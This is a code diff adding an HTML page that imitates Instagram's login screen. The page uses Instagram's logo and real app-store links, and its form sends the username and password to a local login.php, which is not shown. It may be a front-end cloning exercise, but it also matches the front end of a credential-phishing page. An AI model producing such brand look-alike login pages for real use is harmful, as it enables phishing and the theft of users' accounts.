@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="inst.css">
+    <title>Document</title>
+
+</head>
+<body>
+
+    <div class="container">
+    <div class="form"> 
+      
+
+                <img src="./Logo-Instagram.png" alt="" width="175" height="91">
+           
+            
+                <form action="login.php" method="POST";>
+                    <div class="input-field">
+                <input type="text" name="username" placeholder="Phone number, Username, or email">
+                </div>
+                
+                <div class="input-field fun">
+                <input type="password" id="myInput" name="passwd" placeholder="Password" >
+                <span id="scr" onclick="myfun()">
+                <div id="but" >show</div>
+                <div id="hide">Hide</div>
+                </span>
+                </div>
+
+                
+                <br>
+                <div class="input-reg">
+                <button type="submit">Log In</button>
+                </div>
+                </form>
+                
+           
+       <br>
+            <div class="or">
+               <div class="line1"></div>
+               <div class="para">Or</div>
+               <div class="line1"></div>
+            </div>
+            
+            
+            </div>
+        
+        <div class="box2">
+            <div class="para1">Don't have an Account ? <a href="">Sign Up</a></div>
+        </div>
+        <br><br>
+        <div class="box3">
+        <div class="get">Get the app.</div>
+        <br>
+        <div class="app">
+            <div class="play">
+              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US&pli=1"><img src="./c5Rp7Ym-Klz.png" alt="" height="40" width="134.28px"></a>
+            </div>
+            
+            <div class="microsoft">
+              <a href="https://apps.microsoft.com/detail/9NBLGGH5L9XT?hl=en-US&gl=US"><img src="./EHY6QnZYdNX.png" alt="" height="40" width="110.77"></a>
+            </div>
+            </div>
+        </div>
+      
+    </div>
+    <script>
+                function myfun(){
+                    var x = document.getElementById("myInput");
+                    var y = document.getElementById("but");
+                    var z = document.getElementById("hide");
+                    if(x.type === "password"){
+                        x.type = "text";
+                        y.style.display = "none";
+                        z.style.display = "block";
+                        
+                    
+                    }
+                     
+                    else{
+                        x.type = "password";
+                        y.style.display = "block";
+                        z.style.display = "none";
+                    }
+
+                }
+
+                
+            </script>
+</body>
+</html>
